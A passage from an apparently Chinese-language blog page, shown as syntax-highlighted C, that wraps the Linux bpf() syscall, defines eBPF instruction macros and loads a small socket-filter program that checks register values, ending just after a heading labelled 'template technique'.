class="line"><span class="comment"> *      3. @value_size: 即map的value元素的字节数</span></span><br><span class="line"><span class="comment"> *      4. @max_entries: 这个map所允许的最大映射数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret：返回相应的文件描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type,</span></span><br><span class="line"><span class="params">                   <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">                   <span class="type">unsigned</span> <span class="type">int</span> value_size,</span></span><br><span class="line"><span class="params">                   <span class="type">unsigned</span> <span class="type">int</span> max_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type    = map_type,</span><br><span class="line">        .key_size    = key_size,</span><br><span class="line">        .value_size  = value_size,</span><br><span class="line">        .max_entries = max_entries</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_lookup_elem()在fd对应的map中，查找key元素为@key的映射</span></span><br><span class="line"><span class="comment"> * 的value值，并将映射的value值赋给@value</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> *      1. @fd: 要查找的map对应的文件描述符</span></span><br><span class="line"><span class="comment"> *      2. @key: 映射key元素的地址</span></span><br><span class="line"><span class="comment"> *      3. @value：映射value元素的buf地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret：成功找到元素，则返回@value元素的字节数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_lookup_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = (__aligned_u64)key,</span><br><span class="line">        .value  = (__aligned_u64)value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_update_elem()在fd对应的map中，创建/更新映射对</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> *      1. @fd: 要查找的map对应的文件描述符</span></span><br><span class="line"><span class="comment"> *      2. @key: 映射key元素的地址</span></span><br><span class="line"><span class="comment"> *      3. @value：映射value元素的buf地址</span></span><br><span class="line"><span class="comment"> *      4. @flags:用来设置此次操作的类型</span></span><br><span class="line"><span class="comment"> * BPF_NOEXIST，表示仅仅在@key不存在时创建映射；</span></span><br><span class="line"><span class="comment"> * BPF_EXIST，表示仅仅在@key存在是更新映射;</span></span><br><span class="line"><span class="comment"> * BPF_ANY,表示如果存在，则更新，否则创建即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret:成功更新或添加则返回0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_update_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key,</span></span><br><span class="line"><span class="params">                    <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                    <span class="type">uint64_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = (__aligned_u64)key,</span><br><span class="line">        .value  = (__aligned_u64)value,</span><br><span class="line">        .flags  = flags,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_delete_elem()在fd对应的map中，查找key元素为@key的映射</span></span><br><span class="line"><span class="comment"> * 并删除</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> *      1. @fd: 要查找的map对应的文件描述符</span></span><br><span class="line"><span class="comment"> *      2. @key: 映射key元素的地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值</span></span><br><span class="line"><span class="comment"> *      @ret: 成功找到并删除返回0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_delete_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = (__aligned_u64)key,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* bpf_prog_load将ebpf程序载入内核中执行，并返回相关的文件描述符</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. @type：即bpf程序的类型，可以通过man bpf，搜索</span></span><br><span class="line"><span class="comment"> * bpf_prog_type \&#123;关键词查看</span></span><br><span class="line"><span class="comment"> *      2. @insns: 即struct bpf_insn数组，一组指令组成一个</span></span><br><span class="line"><span class="comment"> * bpf数组</span></span><br><span class="line"><span class="comment"> *      3. @insn_cnt:即@insns数组的元素个数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      @ret: ebpf程序关联的文件描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type type,</span></span><br><span class="line"><span class="params">                  <span class="type">const</span> <span class="keyword">struct</span> bpf_insn *insns,</span></span><br><span class="line"><span class="params">                  <span class="type">int</span> insn_cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> bpf_log_size = <span class="number">0x1000</span>, ret;</span><br><span class="line">    <span class="type">char</span> *bpf_log;</span><br><span class="line"></span><br><span class="line">    assert((bpf_log = <span class="built_in">malloc</span>(bpf_log_size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type      = type,</span><br><span class="line">        .insns          = (__aligned_u64)insns,</span><br><span class="line">        .insn_cnt       = insn_cnt,</span><br><span class="line">        .license        = (__aligned_u64)<span class="string">&quot;GPL&quot;</span>,</span><br><span class="line">        .log_buf        = (__aligned_u64)bpf_log,</span><br><span class="line">        .log_size       = bpf_log_size,</span><br><span class="line">        .log_level      = <span class="number">2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ret = bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[bpf]\n%s\n&quot;</span>, bpf_log);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">free</span>(bpf_log);</span><br><span class="line"></span><br><span class="line">    assert(ret &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bpf_prog_load(type, insns)    \</span></span><br><span class="line"><span class="meta">        bpf_prog_load((type), (insns), \</span></span><br><span class="line"><span class="meta">                      sizeof((insns)) / sizeof((insns)[0]))</span></span><br><span class="line"><span class="comment">/* struct bpf_insn的wrapper宏,</span></span><br><span class="line"><span class="comment"> * 参考自内核源代码中的kernel/samples/bpf/bpf_insn.h</span></span><br><span class="line"><span class="comment"> * 其余相关的宏参考/usr/include/linux/bpf_common.h</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ebpf的指令集信息可参考</span></span><br><span class="line"><span class="comment"> * https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * R0: return value from function calls, and exit value for eBPF programs</span></span><br><span class="line"><span class="comment"> * R1 - R5: arguments for function calls</span></span><br><span class="line"><span class="comment"> * R6 - R9: callee saved registers that function calls will preserve</span></span><br><span class="line"><span class="comment"> * R10: read-only frame pointer to access stack</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)  \</span></span><br><span class="line"><span class="meta">  ((struct bpf_insn) &#123;                          \</span></span><br><span class="line"><span class="meta">    .code     = CODE,                           \</span></span><br><span class="line"><span class="meta">    .dst_reg  = DST,                            \</span></span><br><span class="line"><span class="meta">    .src_reg  = SRC,                            \</span></span><br><span class="line"><span class="meta">    .off      = OFF,                            \</span></span><br><span class="line"><span class="meta">    .imm      = IMM &#125;)</span></span><br><span class="line"><span class="comment">/* dst_reg OP= src_reg,</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_ADD(+)   BPF_SUB(-)  BPF_MUL(*)</span></span><br><span class="line"><span class="comment"> * BPF_DIV(/)   BPF_OR(|)   BPF_AND(&amp;)</span></span><br><span class="line"><span class="comment"> * BPF_LSH(&lt;&lt;)  BPF_RSH(&gt;&gt;) BPF_NEG(~)</span></span><br><span class="line"><span class="comment"> * BPF_MOD(%)   BPF_XOR(^)  BPF_MOV(=)</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, 0, 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU32_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, 0, 0)</span></span><br><span class="line"><span class="comment">/* dst_reg OP= imm32,</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_ADD(+)   BPF_SUB(-)  BPF_MUL(*)</span></span><br><span class="line"><span class="comment"> * BPF_DIV(/)   BPF_OR(|)   BPF_AND(&amp;)</span></span><br><span class="line"><span class="comment"> * BPF_LSH(&lt;&lt;)  BPF_RSH(&gt;&gt;) BPF_NEG(~)</span></span><br><span class="line"><span class="comment"> * BPF_MOD(%)   BPF_XOR(^)  BPF_MOV(=)</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU64_IMM32(OP, DST, IMM)           \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, 0, (IMM))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU32_IMM32(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, 0, (IMM))</span></span><br><span class="line"><span class="comment">/* *(dst_reg + off16) = imm32</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ST_MEM(SIZE, DST, OFF, IMM)   \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,   \</span></span><br><span class="line"><span class="meta">               DST, 0, OFF, IMM)</span></span><br><span class="line"><span class="comment">/* *(dst_reg + off16) = src_reg</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)   \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,   \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="comment">/* dst_reg = *(src_reg + off16)</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)   \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,   \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="comment">/* dst_reg = *(imm64)</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LD_IMM64(DST, IMM)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM,     \</span></span><br><span class="line"><span class="meta">               DST, 0, 0, (__u32)(IMM)),      \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(0, 0, 0, 0, ((__64)(IMM)) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">/* if (dst_reg OP src_reg) goto pc + off16</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL             BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP_REG(OP, DST, SRC, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP32_REG(OP, DST, SRC, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="comment">/* if (dst_reg OP imm32) goto pc + off16</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL(参考man bpf-helpers，调用)</span></span><br><span class="line"><span class="comment"> * BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP_IMM32(OP, DST, IMM, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, OFF, IMM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP32_IMM32(OP, DST, IMM, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, OFF, IMM)</span></span><br><span class="line"><span class="comment">/* if (!(dst_reg OP src_reg)) exit</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL(参考man bpf-helpers，调用)</span></span><br><span class="line"><span class="comment"> * BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_EXIT_INSN()  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ASSERT_REG(OP, DST, SRC) \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, 1, 0), \</span></span><br><span class="line"><span class="meta">  BPF_EXIT_INSN()</span></span><br><span class="line"><span class="comment">/* if (!(dst_reg OP imm32)) exit</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL(参考man bpf-helpers，调用)</span></span><br><span class="line"><span class="comment"> * BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ASSERT_IMM32(OP, DST, IMM) \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, 1, IMM), \</span></span><br><span class="line"><span class="meta">  BPF_EXIT_INSN()</span></span><br><span class="line"><span class="comment">/* bpf_prog_load()将bpf程序装载入内核中，然后trigger_bpf()</span></span><br><span class="line"><span class="comment"> * 会将对应的bpf程序关联到对应事件的hook点，并产生相关事件，来</span></span><br><span class="line"><span class="comment"> * 触发执行对应的bpf程序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *    1. @progfd:即bpf_prog_load()返回的关联bpf程序的文件描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_bpf</span><span class="params">(<span class="type">int</span> progfd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sockets[<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x80</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将bpf程序关联到该socket的PACKET FILTER事件</span></span><br><span class="line">  assert(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets) == <span class="number">0</span>);</span><br><span class="line">  assert(setsockopt(sockets[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 向socket中写数据，从而触发PACKET FILTER事件，执行关联的bpf程序</span></span><br><span class="line">  assert(write(sockets[<span class="number">1</span>], buf, <span class="keyword">sizeof</span>(buf)) == <span class="keyword">sizeof</span>(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> progfd;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">    BPF_ALU64_IMM32(BPF_MOV, BPF_REG_0, <span class="number">0x1737</span>),    <span class="comment">/* r0 = 0x1737 */</span></span><br><span class="line">    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_0, <span class="number">0x1737</span>),   <span class="comment">/* assert(r0 = 0x1737) */</span></span><br><span class="line">    BPF_ALU64_REG(BPF_MOV, BPF_REG_2, BPF_REG_0),   <span class="comment">/* r2 = r0 */</span></span><br><span class="line">    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_2, <span class="number">0x1737</span>),   <span class="comment">/* assert(r2 = 0x1737) */</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, <span class="number">-0x8</span>), <span class="comment">/* *(uint64_t*)(r10 - 0x8) = r2 */</span></span><br><span class="line">    BPF_LDX_MEM(BPF_B, BPF_REG_9, BPF_REG_10, <span class="number">-0x8</span>), <span class="comment">/* r9 = *(uint8_t*)(r10 - 0x8) */</span></span><br><span class="line">    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_9, <span class="number">0x37</span>),     <span class="comment">/* assert(r9 = 0x37) */</span></span><br><span class="line">    BPF_EXIT_INSN(),                                <span class="comment">/* exit */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 创建一个socket，并发送数据包，从而触发bpf */</span></span><br><span class="line">  trigger_bpf(progfd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="模板姿势"><a href="#模板姿势" class="headerlink" title="模板姿势"></a>模板姿势</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 